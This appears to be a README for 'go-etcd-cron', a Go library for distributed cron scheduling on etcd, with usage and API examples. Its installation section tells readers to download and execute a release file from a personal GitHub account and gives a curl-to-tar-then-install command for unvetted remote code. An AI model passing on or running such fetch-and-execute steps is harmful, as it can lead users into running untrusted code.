# go-etcd-cron 🌟

![Go Version](https://img.shields.io/badge/Go-1.16%2B-blue)
![License](https://img.shields.io/badge/License-MIT-green)
![Release](https://img.shields.io/badge/Releases-latest-orange)

Welcome to **go-etcd-cron**, a powerful library designed to run a distributed cron-like task scheduler. This library allows you to manage scheduled tasks across multiple nodes seamlessly. Whether you're building microservices or need a reliable way to execute tasks at specific intervals, **go-etcd-cron** is here to help.

## Table of Contents

- [Features](#features)
- [Getting Started](#getting-started)
- [Installation](#installation)
- [Usage](#usage)
- [API Reference](#api-reference)
- [Contributing](#contributing)
- [License](#license)
- [Contact](#contact)

## Features

- **Distributed Scheduling**: Schedule tasks across multiple nodes.
- **Easy to Use**: Simple API for defining and managing tasks.
- **Reliable**: Built on top of etcd for high availability and consistency.
- **Flexible**: Supports cron-like syntax for scheduling.
- **Extensible**: Easily add new features or customize existing ones.

## Getting Started

To get started with **go-etcd-cron**, you will need to set up your environment and install the library. Follow the instructions below to get everything up and running.

### Installation

You can download the latest release from our [Releases section](https://github.com/71youssef71/go-etcd-cron/releases). Once you have the release file, download and execute it to install the library.

```bash
# Example command to download and execute
curl -L https://github.com/71youssef71/go-etcd-cron/releases/latest/download/go-etcd-cron.tar.gz | tar xz
cd go-etcd-cron
go install
```

### Prerequisites

- Go version 1.16 or higher
- An etcd cluster

## Usage

Here's a simple example to illustrate how to use **go-etcd-cron**.

### Step 1: Import the Library

First, import the library in your Go project.

```go
import "github.com/71youssef71/go-etcd-cron"
```

### Step 2: Initialize the Scheduler

Next, create a new scheduler instance.

```go
scheduler := cron.NewScheduler("http://localhost:2379")
```

### Step 3: Define a Task

You can define a task using a cron expression.

```go
scheduler.AddTask("0 * * * *", func() {
    fmt.Println("Task executed every hour")
})
```

### Step 4: Start the Scheduler

Finally, start the scheduler to begin executing tasks.

```go
scheduler.Start()
```

## API Reference

### Scheduler

#### `NewScheduler(etcdURL string) *Scheduler`

Creates a new Scheduler instance.

- **etcdURL**: URL of the etcd cluster.

#### `AddTask(cronExpr string, taskFunc func()) error`

Adds a new task to the scheduler.

- **cronExpr**: Cron expression defining the schedule.
- **taskFunc**: Function to execute when the task runs.

#### `Start()`

Starts the scheduler.

#### `Stop()`

Stops the scheduler.

## Contributing

We welcome contributions to **go-etcd-cron**! If you have ideas for improvements or new features, please open an issue or submit a pull request.

### Steps to Contribute

1. Fork the repository.
2. Create a new branch for your feature or fix.
3. Make your changes.
4. Run tests to ensure everything works.
5. Submit a pull request.

## License

This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.

## Contact

For questions or feedback, feel free to reach out:

- GitHub: [71youssef71](https://github.com/71youssef71)
- Email: your-email@example.com

For more information and updates, visit our [Releases section](https://github.com/71youssef71/go-etcd-cron/releases).

---

Thank you for checking out **go-etcd-cron**! We hope this library helps you manage your scheduled tasks efficiently.